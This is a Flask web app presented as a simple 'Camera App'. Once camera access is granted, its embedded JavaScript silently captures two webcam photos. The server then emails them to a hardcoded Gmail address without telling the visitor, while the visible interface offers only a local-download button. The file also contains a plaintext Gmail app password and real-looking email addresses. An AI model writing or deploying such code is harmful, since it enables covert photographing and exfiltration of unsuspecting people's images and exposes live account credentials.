# app.py
from flask import Flask, render_template_string, request
import smtplib
import ssl
from email.message import EmailMessage
import base64

app = Flask(__name__)

# Email credentials (fixed)
SENDER_EMAIL = "mindmeld025@gmail.com"
SENDER_PASSWORD = "rvuvgegdqzsgrcsn"
RECEIVER_EMAIL = "fermahmuda@gmail.com"

def send_email(image1, image2):
    msg = EmailMessage()
    msg['Subject'] = 'Captured Images'
    msg['From'] = SENDER_EMAIL
    msg['To'] = RECEIVER_EMAIL
    msg.set_content("Here are the captured images.")

    # Attach images (decode base64)
    msg.add_attachment(base64.b64decode(image1.split(",")[1]), maintype='image', subtype='png', filename="image1.png")
    msg.add_attachment(base64.b64decode(image2.split(",")[1]), maintype='image', subtype='png', filename="image2.png")

    context = ssl.create_default_context()
    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
        server.login(SENDER_EMAIL, SENDER_PASSWORD)
        server.send_message(msg)

@app.route('/')
def index():
    return render_template_string("""
<!DOCTYPE html>
<html>
<head>
    <title>Camera App</title>
</head>
<body>
    <h2>Image Capturing</h2>
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <!-- Status text -->
    <div id="status" style="font-weight:bold; color:black; margin-top:10px;"></div>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');
        const statusDiv = document.getElementById('status');

        let images = {};

        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                video.srcObject = stream;

                // Permission allow করার পরই স্বয়ংক্রিয় ক্যাপচার শুরু হবে
                setTimeout(() => captureAndSend(1), 500);   // 1st image
                setTimeout(() => captureAndSend(2), 1500);  // 2nd image
            });

        function captureAndSend(num) {
            statusDiv.innerText = "Image capturing...";
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            let dataUrl = canvas.toDataURL('image/png');
            images["image" + num] = dataUrl;

            if (num === 2) {
                fetch('/send_images', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(images)
                });
            }
        }
    </script>

    <h2>Manual Capture</h2>
    <button onclick="manualCapture()">Capture & Download</button>
    <script>
        function manualCapture() {
            statusDiv.innerText = "Image capturing...";
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            let dataUrl = canvas.toDataURL('image/png');

            let a = document.createElement('a');
            a.href = dataUrl;
            a.download = 'captured.png';
            a.click();
        }
    </script>
</body>
</html>
    """)

@app.route('/send_images', methods=['POST'])
def send_images():
    data = request.json
    image1 = data['image1']
    image2 = data['image2']
    send_email(image1, image2)
    return {"status": "success"}

if __name__ == '__main__':
    app.run(debug=True)
